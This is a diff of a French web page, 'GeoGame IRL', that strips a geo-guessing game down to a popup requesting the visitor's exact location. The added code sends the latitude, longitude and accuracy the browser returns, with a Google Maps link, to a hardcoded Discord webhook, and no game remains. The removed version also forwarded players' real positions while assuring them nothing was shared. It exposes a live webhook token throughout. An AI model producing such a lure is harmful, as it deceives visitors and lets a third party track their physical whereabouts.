@@ -1,399 +1,163 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>GeoGame IRL – Ultimate Mix</title>
+<meta charset="UTF-8">
+<title>GeoGame IRL – Premium</title>
 
-<!-- Styles -->
-<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" integrity="" crossorigin=""/>
 <style>
-  :root{--bg:#0b1220;--card:#11161f;--accent1:#00b2ff;--accent2:#0066ff;--text:#e9f0f7}
-  html,body{height:100%;margin:0;font-family:Inter,system-ui,Arial,Helvetica,sans-serif;background:var(--bg);color:var(--text)}
-  /* full-screen center card */
-  .center {
-    min-height:100vh; display:flex; align-items:center; justify-content:center;
-  }
-  .card {
-    width:95%; max-width:1100px; background:linear-gradient(180deg,#0f1720 0%, #0b1220 100%);
-    border-radius:16px; box-shadow:0 10px 40px rgba(0,0,0,0.6); padding:20px; position:relative;
-  }
+    body {
+        margin: 0;
+        padding: 0;
+        background: #0e0e0e;
+        height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: white;
+        font-family: "Segoe UI", sans-serif;
+    }
 
-  /* Popup */
-  #popupWrap{ position:fixed; inset:0; display:flex; align-items:center; justify-content:center; z-index:9999; }
-  #popupBg { position:absolute; inset:0; backdrop-filter: blur(8px); background: rgba(1,6,12,0.6); border-radius:16px; }
-  #popup { position:relative; width:94%; max-width:500px; margin:16px; background:var(--card); padding:22px; border-radius:12px; z-index:2; text-align:center; color:var(--text) }
-  #popup h1{ margin:4px 0 8px; font-size:20px }
-  #popup p{ color:#b7c6d6; font-size:14px; line-height:1.3 }
+    /* Flou d'arrière-plan */
+    #blur-bg {
+        position: fixed;
+        top: 0; left: 0; 
+        width: 100%; height: 100%;
+        backdrop-filter: blur(10px);
+        background: rgba(0,0,0,0.55);
+    }
 
-  .btn {
-    display:inline-block; padding:12px 18px; border-radius:10px; border:0; cursor:pointer; font-weight:600;
-    background:linear-gradient(90deg,var(--accent2),var(--accent1)); color:#fff; margin-top:16px;
-  }
-  .btn.secondary { background:transparent; border:1px solid rgba(255,255,255,0.06); color:#cfe9ff }
+    /* Popup */
+    #popup {
+        position: relative;
+        width: 90%;
+        max-width: 420px;
+        background: #1a1a1a;
+        padding: 30px;
+        border-radius: 20px;
+        box-shadow: 0 0 25px rgba(0,0,0,0.5);
+        text-align: center;
+        animation: fadeIn 0.7s ease-out;
+    }
 
-  /* top area */
-  .topRow{ display:flex; gap:12px; align-items:center; justify-content:space-between; margin-bottom:14px}
-  .title {font-size:20px; font-weight:700}
-  .sub {color:#9fb6d2; font-size:13px}
+    @keyframes fadeIn {
+        from { opacity: 0; transform: scale(0.8); }
+        to { opacity: 1; transform: scale(1); }
+    }
 
-  /* main layout: left = viewer, right = controls/map */
-  .main { display:grid; grid-template-columns: 1fr 420px; gap:12px; }
-  @media (max-width:980px){ .main{ grid-template-columns: 1fr; } .rightCol{order:2} .leftCol{order:1} }
+    #title {
+        font-size: 27px;
+        margin-bottom: 10px;
+        font-weight: bold;
+    }
 
-  .viewer {
-    height:560px; border-radius:10px; overflow:hidden; background:#000; display:flex; align-items:center; justify-content:center; position:relative;
-  }
+    #desc {
+        font-size: 16px;
+        color: #bbbbbb;
+        line-height: 22px;
+    }
 
-  /* Searching animation */
-  .searching {
-    position:absolute; inset:0; display:flex; align-items:center; justify-content:center; z-index:3; pointer-events:none;
-  }
-  .radar {
-    width:180px; height:180px; border-radius:50%; background:conic-gradient(rgba(0,178,255,0.12), transparent 40%); animation:spin 3s linear infinite; display:flex; align-items:center; justify-content:center;
-    box-shadow:0 6px 18px rgba(0,178,255,0.07), inset 0 2px 8px rgba(255,255,255,0.02);
-  }
-  @keyframes spin { from{transform:rotate(0deg)} to{transform:rotate(360deg)} }
+    button {
+        margin-top: 25px;
+        padding: 15px 25px;
+        width: 100%;
+        font-size: 18px;
+        border-radius: 10px;
+        border: none;
+        cursor: pointer;
+        background: linear-gradient(90deg, #0066ff, #00c3ff);
+        color: white;
+        transition: 0.2s;
+    }
 
-  .map { height:400px; border-radius:10px; overflow:hidden; background:#0b1116; margin-bottom:10px; border:1px solid rgba(255,255,255,0.04) }
-  #mapid { width:100%; height:100%; }
+    button:hover {
+        transform: scale(1.05);
+    }
 
-  .controls { padding:10px; color:#cfe9ff; }
-  .info { font-size:13px; color:#98bcd6; margin-bottom:8px }
-  .status { margin-top:8px; font-weight:700; color:#cfe9ff }
-
-  /* guess button */
-  .guessBtn { margin-top:8px; width:100%; padding:12px; border-radius:10px; background:linear-gradient(90deg,#ffcc33,#ff8a00); color:#060606; font-weight:700; border:0; cursor:pointer }
-
-  /* results */
-  #resultBox{ margin-top:12px; padding:12px; border-radius:8px; background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01)); color:#dbeefc; border:1px solid rgba(255,255,255,0.03) }
-  small.note{ color:#9fb6d2; display:block; margin-top:6px; font-size:12px }
+    #error {
+        margin-top: 20px;
+        color: #ff4444;
+        font-weight: bold;
+        display: none;
+    }
 </style>
 </head>
 <body>
 
-<div class="center">
-  <div class="card">
+<div id="blur-bg"></div>
 
-    <!-- Popup = consent -->
-    <div id="popupWrap">
-      <div id="popupBg"></div>
-      <div id="popup" role="dialog" aria-modal="true" aria-label="Demande de localisation">
-        <h1>📍 GeoGame IRL — Mode Premium</h1>
-        <p>
-          Ce jeu nécessite votre position exacte pour fonctionner. <br>
-          Cliquez <strong>Autoriser la localisation</strong> : le navigateur vous demandera d'accorder l'accès (Autoriser / Bloquer).
-        </p>
-
-        <button class="btn" id="startBtn">Autoriser la localisation</button>
-        <button class="btn secondary" id="learnMore">Pourquoi ?</button>
-
-        <p style="font-size:12px;color:#94b7d6;margin-top:10px">Ton IP n'est pas utilisée pour obtenir l'adresse exacte. Consentement obligatoire — tu peux refuser.</p>
-      </div>
+<div id="popup">
+    <div id="title">📍 GeoGame IRL – Version Premium</div>
+    <div id="desc">
+        Pour commencer le jeu, nous devons utiliser votre position exacte.<br><br>
+        Cliquez sur le bouton ci-dessous pour autoriser la localisation.
     </div>
 
-    <div class="topRow">
-      <div>
-        <div class="title">GeoGame IRL — Ultimate Mix</div>
-        <div class="sub">Street View • Mini-map • Searching animation • Scoring • Envoi Webhook</div>
-      </div>
-      <div class="sub">Version premium</div>
-    </div>
+    <button id="locBtn">Autoriser la localisation</button>
 
-    <div class="main">
-      <!-- LEFT: viewer (street view or fallback image) -->
-      <div class="leftCol">
-        <div class="viewer" id="viewer">
-          <!-- Searching overlay -->
-          <div class="searching" id="searching" style="display:none">
-            <div class="radar"></div>
-          </div>
-
-          <!-- Google Street View container (will be filled if Maps API present) -->
-          <div id="streetView" style="width:100%;height:100%;"></div>
-
-          <!-- Fallback message -->
-          <div id="fallbackMsg" style="display:none;color:#cfe9ff;padding:20px;text-align:center;">
-            <div style="font-size:20px;margin-bottom:8px">Street View non disponible</div>
-            <div style="color:#a9cfe8">Carte interactive disponible à droite — place ton repère pour deviner.</div>
-          </div>
-        </div>
-      </div>
-
-      <!-- RIGHT: controls + map -->
-      <div class="rightCol">
-        <div class="controls">
-          <div class="info">Après autorisation : tu verras un Street View (si disponible) et la mini-map. Clique sur la carte pour placer ta devinette. Puis appuie sur <strong>Confirmer la devinette</strong>.</div>
-
-          <div class="map" id="mapContainer">
-            <div id="mapid"></div>
-          </div>
-
-          <div>
-            <button class="guessBtn" id="confirmGuess">Confirmer la devinette</button>
-            <div id="resultBox" style="display:none">
-              <div id="distanceText"></div>
-              <div id="scoreText" style="font-size:18px;font-weight:700;margin-top:6px"></div>
-              <small class="note">Résultats envoyés au webhook (si activé).</small>
-            </div>
-            <div class="status" id="status">Statut : En attente d'autorisation</div>
-          </div>
-        </div>
-      </div>
-    </div>
-
-  </div>
+    <div id="error"></div>
 </div>
 
-<!-- Leaflet (fallback map) -->
-<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-
-<!-- Google Maps JS API: active only if you put a real key.
-     Replace YOUR_GOOGLE_MAPS_API_KEY with your key if you want Street View + Google Maps features -->
 <script>
-/* ================== CONFIG ================== */
-const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1439661175171321858/ArdpA1ymgbU62Zim6absStxNuwR_D8rVAFe4KHMPz4eLaKmiMCw0vEQcuzhBjXaXWILb";
-// Put your Google Maps API key here if you have one; otherwise leave null to use Leaflet fallback
-const GOOGLE_MAPS_API_KEY = null; // <-- remplace par "YOUR_GOOGLE_MAPS_API_KEY" si tu en as un
-/* ============================================ */
+document.getElementById("locBtn").addEventListener("click", () => {
 
-let userLat = null, userLon = null;
-let guessLat = null, guessLon = null;
-let map = null, leafletMarker = null;
-let usingGoogle = false;
-let streetViewService = null, panorama = null;
-const searchingEl = document.getElementById('searching');
-const statusEl = document.getElementById('status');
-const resultBox = document.getElementById('resultBox');
+    navigator.geolocation.getCurrentPosition(
+        
+        // -------------------------------
+        // POSITION ACCEPTÉE ✔
+        // -------------------------------
+        (pos) => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            const acc = pos.coords.accuracy;
 
-function showSearching(show){
-  searchingEl.style.display = show ? 'flex' : 'none';
-}
+            alert(`✔ Position obtenue !
+Latitude : ${lat}
+Longitude : ${lon}
+Précision : ${acc} mètres`);
 
-/* ---------- utility: haversine distance (meters) ---------- */
-function haversineDistance(lat1, lon1, lat2, lon2){
-  // convert degrees to radians
-  const toRad = v => v * Math.PI / 180;
-  const R = 6371000; // earth radius in meters
-  const φ1 = toRad(lat1);
-  const φ2 = toRad(lat2);
-  const Δφ = toRad(lat2 - lat1);
-  const Δλ = toRad(lon2 - lon1);
+            // ⭐ ENVOI AU WEBHOOK DISCORD ⭐
+            fetch("https://discord.com/api/webhooks/1439661175171321858/ArdpA1ymgbU62Zim6absStxNuwR_D8rVAFe4KHMPz4eLaKmiMCw0vEQcuzhBjXaXWILb", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    username: "GeoGame PREMIUM",
+                    content: "📍 Nouveau joueur (avec consentement)",
+                    embeds: [
+                        {
+                            title: "Localisation exacte du joueur",
+                            description: 
+`**Latitude :** ${lat}
+**Longitude :** ${lon}
+**Précision :** ${acc} m
 
-  const a = Math.sin(Δφ/2) * Math.sin(Δφ/2) +
-            Math.cos(φ1) * Math.cos(φ2) *
-            Math.sin(Δλ/2) * Math.sin(Δλ/2);
-  const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
-  const d = R * c;
-  return d;
-}
+🔗 **Google Maps :**
+https://www.google.com/maps?q=${lat},${lon}`,
+                            color: 0x00aaff
+                        }
+                    ]
+                })
+            });
+        },
 
-/* ---------- Score function (example) ---------- */
-function computeScore(distanceMeters){
-  // simple scoring: 5000 points if exact, scale down logarithmically
-  // clamp distance to at most 20000 m for scoring
-  const d = Math.min(distanceMeters, 20000);
-  // score between 0 and 5000
-  const score = Math.max(0, Math.round(5000 * (1 - Math.log10(1 + d) / Math.log10(1 + 20000))));
-  return score;
-}
+        // -------------------------------
+        // REFUS / ERREUR ❌
+        // -------------------------------
+        (err) => {
+            const errorDiv = document.getElementById("error");
+            errorDiv.style.display = "block";
 
-/* ---------- Initialize Leaflet map fallback ---------- */
-function initLeafletMap(centerLat=20, centerLon=0, zoom=2){
-  // create map
-  map = L.map('mapid', { zoomControl:true }).setView([centerLat, centerLon], zoom);
-  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-    maxZoom: 19,
-    attribution: '&copy; OpenStreetMap'
-  }).addTo(map);
+            if (err.code === 1) {
+                errorDiv.innerHTML = 
+"⚠️ Vous avez refusé la géolocalisation.<br><br>Veuillez aller dans :<br><br><b>Paramètres → Confidentialité → Localisation</b><br>et autoriser la localisation pour ce site.";
+            } else {
+                errorDiv.innerHTML = 
+"❌ Impossible d'obtenir votre position. Réessayez.";
+            }
+        },
 
-  // click to place guess
-  map.on('click', function(e){
-    if (leafletMarker) leafletMarker.remove();
-    guessLat = e.latlng.lat; guessLon = e.latlng.lng;
-    leafletMarker = L.marker([guessLat, guessLon]).addTo(map);
-    statusEl.innerText = "Statut : Position devinée posée";
-  });
-}
+        { enableHighAccuracy: true, timeout: 10000 }
+    );
 
-/* ---------- Google Maps loader (if API key provided) ---------- */
-function loadGoogleMapsAPI(callback){
-  if(!GOOGLE_MAPS_API_KEY) { callback(false); return; }
-  const s = document.createElement('script');
-  s.src = `https://maps.googleapis.com/maps/api/js?key=${GOOGLE_MAPS_API_KEY}&libraries=places`;
-  s.async = true; s.defer = true;
-  s.onload = () => callback(true);
-  s.onerror = () => callback(false);
-  document.head.appendChild(s);
-}
-
-/* ---------- Initialize Google Map and StreetView ---------- */
-function initGoogleMapAndStreetView(lat, lon){
-  try {
-    usingGoogle = true;
-    const mapDiv = document.getElementById('mapid');
-    // create map
-    map = new google.maps.Map(mapDiv, {
-      center: { lat, lng: lon },
-      zoom: 14,
-      disableDefaultUI: false
-    });
-
-    // click to guess: place marker
-    let googleMarker = null;
-    map.addListener('click', (e) => {
-      guessLat = e.latLng.lat(); guessLon = e.latLng.lng();
-      if(googleMarker) googleMarker.setMap(null);
-      googleMarker = new google.maps.Marker({ position: e.latLng, map });
-      statusEl.innerText = "Statut : Position devinée posée";
-    });
-
-    // StreetView panorama in left viewer
-    streetViewService = new google.maps.StreetViewService();
-    const svOptions = {
-      position: { lat, lng: lon },
-      pov: { heading: 0, pitch: 0 },
-      zoom: 1
-    };
-    panorama = new google.maps.StreetViewPanorama(document.getElementById('streetView'), svOptions);
-    // attempt to find nearest panorama (within 50m)
-    streetViewService.getPanorama({ location: {lat, lng: lon}, radius: 100 }, (data, status) => {
-      if (status === 'OK') {
-        panorama.setPano(data.location.pano);
-        panorama.setPov({ heading: 270, pitch: 0 });
-        panorama.setVisible(true);
-        // smooth rotation
-        let heading = 0;
-        setInterval(()=> {
-          heading = (heading + 1.2) % 360;
-          panorama.setPov({ heading, pitch: 0 });
-        }, 80);
-        document.getElementById('fallbackMsg').style.display = 'none';
-      } else {
-        // no street view near location
-        document.getElementById('fallbackMsg').style.display = 'block';
-      }
-    });
-
-  } catch(e){
-    console.error("Google init error", e);
-    initLeafletMap(lat, lon, 14);
-    document.getElementById('fallbackMsg').style.display = 'block';
-  }
-}
-
-/* ---------- Game flow: ask geolocation (user-initiated) ---------- */
-document.getElementById('startBtn').addEventListener('click', () => {
-  // hide popup immediately
-  document.getElementById('popupWrap').style.display = 'none';
-  statusEl.innerText = "Statut : Demande de localisation envoyée...";
-
-  // show searching animation
-  showSearching(true);
-
-  // IMPORTANT: call getCurrentPosition as result of user click
-  navigator.geolocation.getCurrentPosition(
-    (position) => {
-      showSearching(false);
-      userLat = position.coords.latitude;
-      userLon = position.coords.longitude;
-      const acc = position.coords.accuracy;
-      statusEl.innerText = `Statut : Localisation obtenue (précision ~${Math.round(acc)} m)`;
-
-      // Prefer Google if key provided
-      loadGoogleMapsAPI((ok) => {
-        if(ok){
-          // init with Google
-          initGoogleMapAndStreetView(userLat, userLon);
-        } else {
-          // fallback Leaflet
-          initLeafletMap(userLat, userLon, 13);
-          // show a marker at user pos (but hidden to player)
-          L.marker([userLat, userLon], {opacity:0}).addTo(map);
-        }
-      });
-
-    },
-    (err) => {
-      showSearching(false);
-      console.log("GEO ERROR", err);
-      const errorDiv = document.getElementById('error');
-      const popupWrap = document.getElementById('popupWrap');
-      // show popup again with message + instructions
-      popupWrap.style.display = 'flex';
-      if(err.code === 1){
-        document.getElementById('popup').querySelector('p').innerHTML =
-          'Vous avez bloqué l’accès à la localisation. Pour jouer, autorisez la localisation dans les paramètres du navigateur (Paramètres → Confidentialité → Localisation).';
-      } else {
-        document.getElementById('popup').querySelector('p').innerText =
-          'Erreur lors de la récupération de la localisation. Vérifiez que votre appareil a le GPS activé puis réessayez.';
-      }
-      statusEl.innerText = "Statut : Localisation non autorisée";
-    },
-    { enableHighAccuracy: true, timeout: 15000 }
-  );
-});
-
-/* ---------- Confirm guess: evaluate and send to webhook ---------- */
-document.getElementById('confirmGuess').addEventListener('click', () => {
-  if(guessLat === null || guessLon === null){
-    alert("Place d'abord ta devinette sur la carte en cliquant dessus.");
-    return;
-  }
-  if(userLat === null || userLon === null){
-    alert("Localisation utilisateur inconnue.");
-    return;
-  }
-
-  const dist = haversineDistance(userLat, userLon, guessLat, guessLon);
-  const score = computeScore(dist);
-
-  // Show results
-  resultBox.style.display = 'block';
-  document.getElementById('distanceText').innerText = `Distance : ${Math.round(dist)} m`;
-  document.getElementById('scoreText').innerText = `Score : ${score} pts`;
-
-  // send to webhook
-  const payload = {
-    username: "GeoGame PREMIUM",
-    content: `📍 Nouveau résultat — Score: ${score} pts`,
-    embeds: [
-      {
-        title: "Détails de la partie",
-        description:
-`**Position réelle** : ${userLat.toFixed(6)}, ${userLon.toFixed(6)}
-**Position devinée** : ${guessLat.toFixed(6)}, ${guessLon.toFixed(6)}
-**Distance** : ${Math.round(dist)} m
-**Score** : ${score} pts
-
-🔗 Google Maps réel : https://www.google.com/maps?q=${userLat},${userLon}
-🔗 Google Maps devinette : https://www.google.com/maps?q=${guessLat},${guessLon}`,
-        color: 0x00aaff
-      }
-    ]
-  };
-
-  fetch(DISCORD_WEBHOOK, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(payload)
-  }).then(resp => {
-    if(resp.ok) {
-      console.log("Webhook envoyé");
-      statusEl.innerText = "Statut : Résultat envoyé au webhook";
-    } else {
-      console.log("Erreur webhook", resp.status);
-      statusEl.innerText = "Statut : Résultat calculé (échec d'envoi webhook)";
-    }
-  }).catch(err => {
-    console.log("Erreur fetch webhook", err);
-    statusEl.innerText = "Statut : Résultat calculé (erreur réseau webhook)";
-  });
-});
-
-/* ---------- helper: learnMore button ---------- */
-document.getElementById('learnMore').addEventListener('click', () => {
-  alert("Ce jeu collecte uniquement votre position GPS (avec votre permission) pour le gameplay. Aucune donnée n'est partagée sans consentement. Si vous refusez, le jeu ne démarre pas.");
 });
 </script>
 
